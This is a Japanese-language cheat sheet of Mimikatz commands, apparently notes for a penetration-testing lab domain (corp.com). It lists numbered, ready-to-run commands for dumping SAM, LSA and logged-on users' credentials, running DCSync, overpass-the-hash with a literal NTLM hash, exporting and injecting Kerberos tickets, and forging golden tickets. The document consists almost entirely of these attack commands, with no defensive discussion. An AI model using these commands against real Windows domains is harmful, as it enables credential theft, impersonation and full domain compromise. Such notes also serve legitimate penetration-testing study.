# Mimikatz
[Documentation]()

## コマンド集

1. Mimikatzのプロセスにデバッグ権限を要求して、認証情報の抽出を可能にする。SeDebugPrivlege権限を取得する。
```
privilege::debug
```

2. SYSTEM権限に昇格する
```
token::elevate
```

3. SAMデータベースからユーザのNTLMハッシュをダンプする
```
lsadump::sam
```

4. Sekurlsaモジュールを使ってログオンしているすべてのユーザの資格情報、ハッシュをダンプする
```
sekurlsa::logonpasswords
```

5. jeffadminユーザとして、ターゲットのweb04.corp.comサービスにおける認証チケットを作成する。
```
kerberos::golden /sid:<sid> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:(ターゲットNTLMハッシュ) /user:jeffadmin
```

6. DCSYNC攻撃をするためのコマンドで、/userの引数にドメイン\ユーザの形式で指定。これでターゲットユーザの資格情報を取得できる。
```
lsadump::dcsync /user:corp\dave
```

7. Pass the HashではなくOverpass the Hash攻撃。ターゲットユーザのNTLMハッシュを使ってpowershellを起動する。  
PtHとの違いとして、Kerberosを使って認証している点がある。
```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

8. 長い出力を後で見やすくするように"hoge.txt"に出力の結果をログとして保存する。他のコマンドを実行する前にこのコマンドを実行しておく。
```
log "hoge.txt"
```

9. メモリからすべての**Ticket Granting Ticket**と**Ticket Granting Service**をエクスポートする。  
エクスポートされたファイルは、.kirbi形式でディスクに保存される。  
このコマンドは、TGS/TGTのメモリ内にあるLSASSのプロセス領域を解析してダンプしている。
```
sekurlsa::tickets /export
```

10. ticketsのエクスポートで出力された.kirbi形式の**Ticket Granting Service**ファイルを選択して、Pass the Ticketを行う。  
OKが返ってくればインジェクションは成功。この時点で、klistをするとセッション内にチケットが入っていることを確認できる。
```
kerberos::ptt [0;102990]-0-0-40810000-dave@cifs-web04.kirbi 
```

11. Local Security AuthorityことLSAからユーザのNTLMをダンプできる。
```
lsadump::lsa /patch
```

12. 既存のKerberosチケットを削除する。新しくゴールデンチケットを作るときとかに使う。
```
kerberos::purge
```

13. ゴールデンチケットを偽造する。  
既存のユーザ名を指定する必要があり、sidはwhoami /userで確認可能。
```
kerberos::golden /user:<既存のユーザ名> /domain:corp.com /sid:<指定したユーザのSID、whoami /userで確認できる> /krbtgt:<krbtgtユーザのNTLMhash> /ptt
```

14. 現在のmimikatzセッションでcmdを起動する。ゴールデンチケット生成した後とかはこれやらないと意味ない。
```
misc::cmd
```